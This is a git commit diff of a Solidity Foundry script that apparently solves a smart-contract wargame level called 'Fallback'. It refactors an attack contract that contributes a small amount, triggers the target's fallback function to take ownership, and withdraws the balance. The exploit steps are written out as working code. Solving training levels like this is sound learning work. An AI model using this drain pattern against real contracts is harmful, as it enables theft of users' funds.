ebdce7f72e6e7c7cc754e59d8d656f8391c53653
Claudia <claudiabarcelovaldes40@gmail.com>
2023-12-23 18:03:55 +0100

    make fallback attack broadcasted

--- script/LevelAttacks/01FallbackAttk.sol
+++ script/LevelAttacks/01FallbackAttk.sol
@@ -2,23 +2,16 @@
 
 pragma solidity ^0.8.19;
 
-import {console, Script} from "forge-std/Script.sol";
+import {Broadcasted} from "./Broadcasted.sol";
 
-contract FallbackAttk is Script {
-    function attack(address payable fallbackCtr) public payable {
+contract FallbackAttk is Broadcasted {
+    function attack(address payable fallbackCtr) public payable override {
         // contribute to have contributions[msg.sender] > 0
         IFallback(fallbackCtr).contribute{value: 0.00001 ether}();
         // call fallback function
         fallbackCtr.call{value: 0.00001 ether}("");
         // withdraw
         IFallback(fallbackCtr).withdraw();
-    }
-
-    function broadcastedAttack(address payable fallbackCtr) external payable {
-        // start broadcst to sign the transactions as the msg.sender(our address)
-        vm.startBroadcast();
-        attack(fallbackCtr);
-        vm.stopBroadcast();
     }
 }
 
